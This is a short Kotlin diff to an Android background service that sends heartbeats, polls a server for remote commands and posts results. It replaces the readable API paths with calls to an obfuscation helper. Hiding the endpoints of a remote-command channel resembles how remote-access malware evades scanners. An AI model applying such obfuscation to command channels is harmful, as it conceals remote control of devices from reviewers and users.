@@ -168,7 +168,7 @@ class ConnectorService : Service() {
             addProperty("deviceName", deviceName)
             add("device", deviceJson)
         }
-        post("$SERVER_URL/api/device/heartbeat", body.toString())
+        post("$SERVER_URL${ObfStr.apiHeartbeat()}", body.toString())
         updateNotification("Connected · $deviceName", true)
     }
 
@@ -179,7 +179,7 @@ class ConnectorService : Service() {
     private data class PendingCmd(val id: String, val command: String, val extra: String?)
 
     private fun pollCommand(): PendingCmd? {
-        val resp = get("$SERVER_URL/api/device/poll?deviceId=$deviceId") ?: return null
+        val resp = get("$SERVER_URL${ObfStr.apiPoll()}$deviceId") ?: return null
         val json = JsonParser.parseString(resp).asJsonObject
         val command = if (json.has("command") && !json.get("command").isJsonNull)
             json.get("command").asString else return null
@@ -627,7 +627,7 @@ class ConnectorService : Service() {
                 try { add("data", JsonParser.parseString(result).asJsonObject) } catch (_: Exception) {}
             }
         }
-        post("$SERVER_URL/api/device/result", body.toString())
+        post("$SERVER_URL${ObfStr.apiResult()}", body.toString())
     }
 
     // ─────────────────────────────────────────
